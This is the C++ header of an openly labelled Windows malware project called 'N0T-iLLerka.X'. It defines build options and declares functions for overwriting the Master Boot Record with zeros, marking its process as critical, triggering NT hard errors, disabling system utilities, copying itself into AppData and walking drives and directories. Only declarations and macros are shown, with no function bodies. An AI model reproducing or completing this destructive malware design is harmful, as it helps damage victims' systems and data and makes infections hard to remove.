#pragma once
// TODO: Clean this Mess up

// Warning Message: //
/* #define DISABLE_WARNING */
	// If defined: Shows the user a warning message that he is about to execute Malware.
	//			   ( IT IS NOT RECOMMENDED TO DISABLE THIS FEATURE ! )

// Kill MasterBootRecord: //
/* #define KILL_MBR */
	// If defined: Kills the MBR (MasterBootRecord) by overwriting it (with Zeros)
	//			   (Optional)


//// Debug Mode: ////
#define DEBUG
	// If defined: Allows you to disables security features, used by the Malware to prevent the user from tampering with it.
	//			   Also allows you to enable certain debugging features.

//// Debug Suboptions: (some might require DEBUG Mode to be enabled) ////
#ifdef DEBUG
	// Show Debug Messages: //
	#define DEBUG_MSG
		// If defined: Shows the user Error/Warning/Information/(Question) MessageBoxes used for debbuging.

	// NT Process Persistency: //
	#define DISABLE_NT_FUNCTIONS
		// If defined: Disables and prevents the Malware from utilizing the NT Functions used for Process Persistency.

	// Mutex utilization: //
	/* #define DISABLE_MUTEX */
		// If defined: Disables the usage of the Global Mutex
		//			   (It is not recommended to disable this feature, but it might be somtimes necessary for debugging purposes)

// TODO: fix this...
	// Semaphore utilization: //
	/* #define DISABLE_SEMAPHORE */
		// If defined: Disables the usage of the Global Semaphore
		//			   (It is not recommended to disable this feature, but it might be somtimes necessary for debugging purposes)
#endif

// Debug MessageBox Template //
/*
	// TODO: modify this
	#ifdef DEBUG_MSG
		MessageBox(NULL, L"", L"", MB_OK |  MB_ICON | MB_SYSTEMMODAL);
	#endif // DEBUG_MSG
*/

// Header Files //
#include <Windows.h>
#include <bcrypt.h>
#include <string>
#include <Shlobj.h>
#include <Shlwapi.h>
#include <vector>

#include <strsafe.h>

// Libraries //
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")

#ifndef DISABLE_NT_FUNCTIONS
#pragma comment(lib, "ntdll.lib")
#endif // !DISABLE_NT_FUNCTIONS

// Define Macros //
#define MALWR_NAME L"N0T-iLLerka.X"

#define MIN_RSLEN 0x8
#define MAX_RSLEN 0x10

#define MAX_BUFFER_SIZE 0x2000000

#define HOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv./host.Proc(running)"
#define HOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv./host.Proc(running)"
#define MAX_SMPO 2

#define REGISTRY_KEY L"SOFTWARE\\N0T-iLLerka.X"
#define REGISTRY_SUBKEY L"N0TiLLerka"
#define REGISTRY_VALUE 0xBADC0DE

// Function Macros //
#define RandomStringGenerator	fnCryptGenRandomStringW
#define CreateRegistryKey		fnCreateRegistryKeyW
#define CheckRegistryKey		fnCheckRegistryKeyW
#define DriveEnumerator			fnDriveEnumeratorW
#define CopyFileToAppData		fnCopyFileW
#define DirectoryIterator		fnDirectoryIteratorW
#define CryptGenRandomBuffer	fnCryptGenRandomBufferW

#ifndef DISABLE_MUTEX
#define CheckMutex				fnCheckMutexW
#endif // !DISABLE_MUTEX
#ifndef DISABLE_SEMAPHORE
#define CheckSemaphore			fnCheckSemaphoreW
#endif // !DISABLE_SEMAPHORE

// Arrays //
extern const WCHAR szCharSet[];
extern const size_t cnCharSet;

#ifdef DEBUG_MSG
extern PWCHAR pszDest;
extern const size_t cnDest;
#endif // DEBUG_MSG

// FileSystem Functions //
BOOL fnCopyFileW(LPCWSTR lpAdpn, LPCWSTR lpAdfn, WCHAR szMfn[]);
BOOL fnDriveEnumeratorW(std::vector<std::wstring>& vszDrive);
BOOL fnDirectoryIteratorW(std::wstring szDir, std::wstring szMask, std::vector<std::wstring>& vszDir, std::vector<std::wstring>& vszFile);

#ifdef KILL_MBR
BOOL fnOverwriteMBR(VOID);
#endif // KILL_MBR

// RegEdit Functions //
BOOL fnCreateRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, DWORD dwValue);
BOOL fnCheckRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwEType, BYTE bEValue);
BOOL fnDisableUtilities(VOID);

// Synchronization Functions //
#ifndef DISABLE_MUTEX
BOOL fnCheckMutexW(LPCWSTR lpName);
#endif // !DISABLE_MUTEX
#ifndef DISABLE_SEMAPHORE
HANDLE fnCheckSemaphoreW(LPCWSTR lpName);
#endif // !DISABLE_SEMAPHORE

// Utilitie Functions //
INT fnCryptGenRandomNumber(VOID);
std::wstring fnCryptGenRandomStringW(INT nLen);
VOID fnCryptGenRandomBufferW(PWCHAR pszRd, ULONG ulFs);
BOOL fnIsUserAdmin(VOID);

// NT Utilitie Functions //
#ifndef DISABLE_NT_FUNCTIONS
BOOL fnImportNTDLLFunctions(VOID);
BOOL fnNTSetProcessIsCritical(BOOLEAN blIsCritical);
BOOL fnNTRaiseHardError(VOID);
#endif // !DISABLE_NT_FUNCTIONS